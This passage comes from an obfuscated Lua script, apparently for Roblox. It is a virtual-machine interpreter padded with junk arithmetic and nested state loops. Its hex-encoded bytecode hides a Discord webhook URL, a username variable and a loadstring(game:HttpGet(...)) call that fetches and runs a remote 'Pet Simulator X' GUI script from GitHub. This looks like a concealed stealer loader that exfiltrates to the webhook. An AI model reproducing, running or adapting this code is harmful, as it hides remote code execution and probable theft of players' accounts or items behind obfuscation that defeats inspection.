																															v254 = v138;
																															v255 = v139;
																															v256 = v140;
																															v253 = 1;
																														end
																														if (v253 == 2) then
																															v260 = {};
																															for v266 = 0, v212 do
																																if (v266 >= v256) then
																																	v258[v266 - v256] = v211[v266 + 1];
																																else
																																	v260[v266] = v211[v266 + 1 + 0 + 0];
																																end
																															end
																															v261 = (v212 - v256) + 1 + 0;
																															v253 = 3;
																														end
																														if (v253 == 1) then
																															v257 = v52;
																															v258 = {};
																															v259 = {};
																															v253 = 2;
																														end
																													end
																												end;
																												v232 = 1;
																											end
																											if (v232 == 1) then
																												v208 = 3;
																												break;
																											end
																										end
																									end
																									if (v208 == 0) then
																										local v233 = 0;
																										while true do
																											if (1 == v233) then
																												v208 = 1;
																												break;
																											end
																											if (v233 == 0) then
																												v209 = (1809 - (1744 + 64)) + 0;
																												v210 = -(1 - (397 - (43 + 354)));
																												v233 = 1;
																											end
																										end
																									end
																									if (v208 == 1) then
																										local v234 = 0;
																										while true do
																											if (v234 == 0) then
																												v211 = {...};
																												v212 = v20("#", ...) - (1 + 0);
																												v234 = 1;
																											end
																											if (v234 == 1) then
																												v208 = 2;
																												break;
																											end
																										end
																									end
																								end
																								break;
																							end
																							if (v207 == 0) then
																								v208 = 0;
																								v209 = nil;
																								v207 = 1;
																							end
																						end
																					end;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
												end;
												return v54(v53(), {}, v36)(...);
											end
										end
									end
									if (v42 == 2) then
										local v60 = 0;
										while true do
											if (v60 == 0) then
												v46 = function(v96, v97, v98, v99, v100, v101, v102)
													local v141 = 0;
													local v142;
													local v143;
													while true do
														if (v141 == 0) then
															v142 = 0 - 0;
															v143 = nil;
															v141 = 1;
														end
														if (v141 == 1) then
															while true do
																local v176 = 0;
																while true do
																	if (v176 == 0) then
																		if ((4 - 3) == v142) then
																			return v143;
																		end
																		if (v142 == (65 - (32 + 33))) then
																			local v192 = 0;
																			while true do
																				if (1 == v192) then
																					v142 = 1;
																					break;
																				end
																				if (v192 == 0) then
																					v143 = v9(v35, v43, v43);
																					v43 = v43 + ((2389 - (1909 - 1132)) - (1399 + 205 + 7));
																					v192 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
												end;
												v47 = nil;
												v60 = 1;
											end
											if (v60 == 1) then
												v47 = function(v103, v104, v105, v106, v107)
													local v144 = 0;
													local v145;
													local v146;
													local v147;
													while true do
														if (v144 == 1) then
															v147 = nil;
															while true do
																local v177 = 0;
																while true do
																	if (0 == v177) then
																		if (v145 == 0) then
																			local v193 = 0;
																			while true do
																				if (v193 == 1) then
																					v145 = 1;
																					break;
																				end
																				if (v193 == 0) then
																					v146, v147 = v9(v35, v43, v43 + (7 - 5));
																					v43 = v43 + (1019 - (974 + ((3 + 113) - 73)));
																					v193 = 1;
																				end
																			end
																		end
																		if (v145 == 1) then
																			return (v147 * (1975 - (((4251 - (172 + 762)) - ((3178 - (1037 + 807)) + 581)) + (487 - 170)))) + v146;
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (v144 == 0) then
															v145 = 1099 - (892 + 207);
															v146 = nil;
															v144 = 1;
														end
													end
												end;
												v42 = 3;
												break;
											end
										end
									end
									v56 = 2;
								end
								if (v56 == 2) then
									if (5 == v42) then
										local v61 = 0;
										while true do
											if (v61 == 1) then
												v52 = function(...)
													return {...}, v20("#", ...);
												end;
												v42 = 6;
												break;
											end
											if (0 == v61) then
												v51 = v48;
												v52 = nil;
												v61 = 1;
											end
										end
									end
									if (v42 == 3) then
										local v62 = 0;
										while true do
											if (v62 == 1) then
												v49 = nil;
												v42 = 4;
												break;
											end
											if (v62 == 0) then
												v48 = nil;
												v48 = function(v108, v109, v110, v111, v112, v113, v114, v115, v116)
													local v148 = 0;
													local v149;
													local v150;
													local v151;
													local v152;
													local v153;
													while true do
														if (v148 == 0) then
															v149 = 0;
															v150 = nil;
															v148 = 1;
														end
														if (v148 == 2) then
															v153 = nil;
															while true do
																local v178 = 0;
																while true do
																	if (v178 == 0) then
																		if (0 == v149) then
																			local v194 = 0;
																			while true do
																				if (v194 == 0) then
																					v150, v151, v152, v153 = v9(v35, v43, v43 + (3 - 0));
																					v43 = v43 + ((631 + 380) - ((83 - 37) + 355 + 47 + 559));
																					v194 = 1;
																				end
																				if (v194 == 1) then
																					v149 = 1;
																					break;
																				end
																			end
																		end
																		if (v149 == 1) then
																			return (v153 * ((74887138 - (81 + 1790)) - (151519250 - 93411199))) + (v152 * 65536) + (v151 * (28 + 57 + 35 + (1449 - (108 + 1205)))) + v150;
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (1 == v148) then
															v151 = nil;
															v152 = nil;
															v148 = 2;
														end
													end
												end;
												v62 = 1;
											end
										end
									end
									v56 = 3;
								end
								if (v56 == 3) then
									if (v42 == 6) then
										local v63 = 0;
										while true do
											if (v63 == 1) then
												v54 = nil;
												v42 = 7;
												break;
											end
											if (v63 == 0) then
												v53 = nil;
												v53 = function(v117, v118, v119, v120, v121, v122)
													local v154 = 0;
													local v155;
													local v156;
													local v157;
													local v158;
													local v159;
													local v160;
													local v161;
													while true do
														if (v154 == 3) then
															v161 = nil;
															while true do
																local v179 = 0;
																while true do
																	if (v179 == 0) then
																		if (v155 == 0) then
																			local v195 = 0;
																			while true do
																				if (v195 == 0) then
																					v156 = {};
																					v157 = {};
																					v195 = 1;
																				end
																				if (v195 == 1) then
																					v158 = {};
																					v159 = {v156,v157,nil,v158};
																					v195 = 2;
																				end
																				if (v195 == 2) then
																					v155 = 1;
																					break;
																				end
																			end
																		end
																		if (v155 == 1) then
																			local v196 = 0;
																			while true do
																				if (v196 == 1) then
																					for v214 = 1789 - (722 + 1066), v160 do
																						local v215 = 0;
																						local v216;
																						local v217;
																						local v218;
																						while true do
																							if (v215 == 1) then
																								v218 = nil;
																								while true do
																									if (v216 == 0) then
																										local v235 = 0;
																										while true do
																											if (v235 == 0) then
																												v217 = v46();
																												v218 = nil;
																												v235 = 1;
																											end
																											if (1 == v235) then
																												v216 = 1;
																												break;
																											end
																										end
																									end
																									if (v216 == 1) then
																										if (v217 == 1) then
																											v218 = v46() ~= (0 + 0);
																										elseif (v217 == (9 - 7)) then
																											v218 = v49();
																										elseif (v217 == ((2514 - (504 + 1097)) - (147 + (2250 - 1487)))) then
																											v218 = v50();
																										end
																										v161[v214] = v218;
																										break;
																									end
																								end
																								break;
																							end
																							if (v215 == 0) then
																								v216 = 0;
																								v217 = nil;
																								v215 = 1;
																							end
																						end
																					end
																					v159[3 + 0] = v46();
																					v196 = 2;
																				end
																				if (0 == v196) then
																					v160 = v48();
																					v161 = {};
																					v196 = 1;
																				end
																				if (v196 == 2) then
																					v155 = 2;
																					break;
																				end
																			end
																		end
																		v179 = 1;
																	end
																	if (v179 == 1) then
																		if (v155 == 2) then
																			local v197 = 0;
																			while true do
																				if (v197 == 1) then
																					for v219 = (1 + 0) - 0, v48() do
																						v158[v219] = v48();
																					end
																					return v159;
																				end
																				if (0 == v197) then
																					for v221 = 1, v48() do
																						local v222 = 0;
																						local v223;
																						local v224;
																						while true do
																							if (1 == v222) then
																								while true do
																									if (v223 == 0) then
																										v224 = v46();
																										if (v45(v224, 1, 1) == 0) then
																											local v241 = 0;
																											local v242;
																											local v243;
																											local v244;
																											local v245;
																											while true do
																												if (v241 == 1) then
																													v244 = nil;
																													v245 = nil;
																													v241 = 2;
																												end
																												if (0 == v241) then
																													v242 = 0;
																													v243 = nil;
																													v241 = 1;
																												end
																												if (v241 == 2) then
																													while true do
																														if (v242 == 3) then
																															if (v45(v244, 390 - (86 + 301), 1 + 0 + 2) == 1) then
																																v245[5 - (2 - 1)] = v161[v245[(1533 - (218 + 1304)) - (7 + 0)]];
																															end
																															v156[v221] = v245;
																															break;
																														end
																														if (2 == v242) then
																															local v268 = 0;
																															while true do
																																if (v268 == 0) then
																																	if (v45(v244, 1, 1373 - (857 + 515)) == (1 + 0 + 0)) then
																																		v245[2] = v161[v245[2]];
																																	end
																																	if (v45(v244, 2 + 0, 5 - 3) == (1 - 0)) then
																																		v245[(3 + 2) - (2 + 0)] = v161[v245[3]];
																																	end
																																	v268 = 1;
																																end
																																if (v268 == 1) then
																																	v242 = 3;
																																	break;
																																end
																															end
																														end
																														if (v242 == 0) then
																															local v269 = 0;
																															while true do
																																if (0 == v269) then
																																	v243 = v45(v224, 2, 2 + 1);
																																	v244 = v45(v224, 1 + 3, (1298 - (473 + 798)) - 21);
																																	v269 = 1;
																																end
																																if (1 == v269) then
																																	v242 = 1;
																																	break;
																																end
																															end
																														end
																														if (v242 == 1) then
																															local v270 = 0;
																															while true do
																																if (v270 == 1) then
																																	v242 = 2;
																																	break;
																																end
																																if (0 == v270) then
																																	v245 = {v47(),v47(),nil,nil};
																																	if (v243 == (1849 - (1316 + 533))) then
																																		local v281 = 0;
																																		local v282;
																																		while true do
																																			if (v281 == 0) then
																																				v282 = 0;
																																				while true do
																																					if (v282 == 0) then
																																						v245[1475 - (1406 + 66)] = v47();
																																						v245[4 + 0] = v47();
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	elseif (v243 == ((2 + 2) - (9 - 6))) then
																																		v245[5 - 2] = v48();
																																	elseif (v243 == (1 + 0 + (956 - (924 + 31)))) then
																																		v245[1 + 2] = v48() - (2 ^ 16);
																																	elseif (v243 == (1881 - (723 + 1155))) then
																																		local v290 = 0;
																																		local v291;
																																		while true do
																																			if (v290 == 0) then
																																				v291 = 0;
																																				while true do
																																					if (v291 == 0) then
																																						v245[3] = v48() - ((1951 - (1526 + 423)) ^ 16);
																																						v245[4] = v47();
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	v270 = 1;
																																end
																															end
																														end
																													end
																													break;
																												end
																											end
																										end
																										break;
																									end
																								end
																								break;
																							end
																							if (v222 == 0) then
																								v223 = 0;
																								v224 = nil;
																								v222 = 1;
																							end
																						end
																					end
																					for v225 = 378 - (289 + 88), v48() do
																						v157[v225 - 1] = v53();
																					end
																					v197 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (2 == v154) then
															v159 = nil;
															v160 = nil;
															v154 = 3;
														end
														if (v154 == 0) then
															v155 = 0;
															v156 = nil;
															v154 = 1;
														end
														if (v154 == 1) then
															v157 = nil;
															v158 = nil;
															v154 = 2;
														end
													end
												end;
												v63 = 1;
											end
										end
									end
									if (v42 == 0) then
										local v64 = 0;
										while true do
											if (v64 == 1) then
												v35 = v12(v11(v35, 5), v7("\58\237", "\20\195\98\174"), function(v123)
													if (v9(v123, 2 + 0) == (125 - 46)) then
														local v168 = 0;
														local v169;
														while true do
															if (0 == v168) then
																v169 = 0;
																while true do
																	if (v169 == 0) then
																		local v182 = 0;
																		while true do
																			if (v182 == 0) then
																				v44 = v8(v11(v123, 1, 1));
																				return "";
																			end
																		end
																	end
																end
																break;
															end
														end
													else
														local v170 = 0;
														local v171;
														local v172;
														while true do
															if (v170 == 0) then
																v171 = 0;
																v172 = nil;
																v170 = 1;
															end
															if (v170 == 1) then
																while true do
																	if (v171 == 0) then
																		v172 = v10(v8(v123, 1 + 15));
																		if v44 then
																			local v198 = 0;
																			local v199;
																			local v200;
																			while true do
																				if (v198 == 1) then
																					while true do
																						local v229 = 0;
																						while true do
																							if (v229 == 0) then
																								if (v199 == 1) then
																									return v200;
																								end
																								if (v199 == 0) then
																									local v237 = 0;
																									while true do
																										if (v237 == 0) then
																											v200 = v13(v172, v44);
																											v44 = nil;
																											v237 = 1;
																										end
																										if (v237 == 1) then
																											v199 = 1;
																											break;
																										end
																									end
																								end
																								break;
																							end
																						end
																					end
																					break;
																				end
																				if (v198 == 0) then
																					v199 = 0;
																					v200 = nil;
																					v198 = 1;
																				end
																			end
																		else
																			return v172;
																		end
																		break;
																	end
																end
																break;
															end
														end
													end
												end);
												v42 = 1;
												break;
											end
											if (v64 == 0) then
												v43 = 1 + (0 - 0);
												v44 = nil;
												v64 = 1;
											end
										end
									end
									break;
								end
							end
						end
						break;
					end
					if (0 == v41) then
						v42 = 0;
						v43 = nil;
						v44 = nil;
						v41 = 1;
					end
					if (v41 == 1) then
						v45 = nil;
						v46 = nil;
						v47 = nil;
						v41 = 2;
					end
				end
			end;
			v23("LOL!283O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00557365726E616D65030B3O00F9CB180C1EF8C3190612A603053O0094AA6A677103073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130383230332O3539313931323337383437382F5574597A6169505F52327A39665765485238427866334F2D48434E4B6643707436444976585279392D516274717A317267447643456553654C7744745A7A343134496C6303023O005F4703103O0065C825F252C775DE24EF4DDE68DC3BE303063O0026BD56863DAA03043O00C7B1891003073O0084DEEC7ED0447803053O0084DBB399ED03063O00D0BECBEDDCB103103O002C8451710F9303541086477D1BC90D3603043O007FE7231803053O0088ABBBEDEE03043O00DCCEC39903123O00260BC40F20AF02510CC2096992062O03DD0F03073O00716AAD7B49C16503053O0021FF3C12B303073O00759A446680275703133O00FA4D3AB9505D39DE050CB9495D27CD5671F41503073O00B9255FDA3B345703053O004EEEAC322E03043O001A8BD44603133O006C90449E4B8D4B8B1FB7469E5694519F11CA0B03043O003FE425EC030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756100573O0012143O00013O0020125O0002001214000100013O002012000100010003001214000200013O002012000200020004001214000300053O00061A0003000A00010001002O043O000A0001001214000300063O002012000400030007001214000500083O002012000500050009001214000600083O00201200060006000A00060F00073O000100062O000D3O00064O000D8O000D3O00044O000D3O00014O000D3O00024O000D3O00054O000D000800073O0012110009000C3O001211000A000D4O001C0008000A000200120C0008000B3O0012110008000F3O00120C0008000E3O001214000800104O000D000900073O001211000A00113O001211000B00124O001C0009000B00022O000D000A00073O001211000B00133O001211000C00144O001C000A000C00022O001000080009000A001214000800104O000D000900073O001211000A00153O001211000B00164O001C0009000B00022O000D000A00073O001211000B00173O001211000C00184O001C000A000C00022O001000080009000A001214000800104O000D000900073O001211000A00193O001211000B001A4O001C0009000B00022O000D000A00073O001211000B001B3O001211000C001C4O001C000A000C00022O001000080009000A001214000800104O000D000900073O001211000A001D3O001211000B001E4O001C0009000B00022O000D000A00073O001211000B001F3O001211000C00204O001C000A000C00022O001000080009000A001214000800104O000D000900073O001211000A00213O001211000B00224O001C0009000B00022O000D000A00073O001211000B00233O001211000C00244O001C000A000C00022O001000080009000A001214000800253O001214000900263O002015000900090027001211000B00284O00090009000B6O00083O00022O00070008000100012O00133O00013O00013O00023O00026O00F03F026O00704002284O001900025O001211000300014O000E00045O001211000500013O0004010003002300012O000200076O000D000800024O0002000900014O0002000A00024O0002000B00034O0002000C00044O000D000D6O000D000E00063O002005000F000600012O0009000C000F6O000B3O00022O0002000C00034O0002000D00044O000D000E00013O002006000F000600012O000E001000014O000B000F000F001000101B000F0001000F0020060010000600012O000E001100014O000B00100010001100101B0010000100100020050010001000012O0009000D00104O0008000C8O000A3O0002002003000A000A00022O00170009000A4O000A00073O00010004160003000500012O0002000300054O000D000400024O0018000300044O001D00036O00133O00017O00283O00093O000A3O000A3O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000A3O000D3O000D3O000D3O000D3O000E3O00573O00013O00013O00023O00023O00033O00033O00043O00043O00043O00043O00053O00063O00063O00073O00073O000E3O000E3O000E3O000E3O000E3O000E3O000E3O000F3O000F3O000F3O000F3O000F3O00103O00103O00113O00113O00113O00113O00113O00113O00113O00113O00113O00113O00123O00123O00123O00123O00123O00123O00123O00123O00123O00123O00133O00133O00133O00133O00133O00133O00133O00133O00133O00133O00143O00143O00143O00143O00143O00143O00143O00143O00143O00143O00153O00153O00153O00153O00153O00153O00153O00153O00153O00153O00163O00163O00163O00163O00163O00163O00163O00163O00", v17(), ...);
			break;
		end
		if (v24 == 1) then
			v3 = bit32 or bit;
			v4 = v3.bxor;
			v5 = table.concat;
			v24 = 2;
		end
		if (4 == v24) then
			v11 = _G[v7("\165\6\223\142\180\193", "\214\114\173\231\218\166\69\215")][v7("\26\72\9", "\105\61\107\49\151\173\123")];
			v12 = _G[v7("\42\96\205\123\31\45", "\89\20\191\18\113\74")][v7("\228\32\216\12", "\131\83\173\110")];
			v13 = _G[v7("\255\192\203\236\75\252", "\140\180\185\133\37\155\46")][v7("\53\253\24", "\71\152\104\167\177\101\203\163")];
			v24 = 5;
		end
	end
end
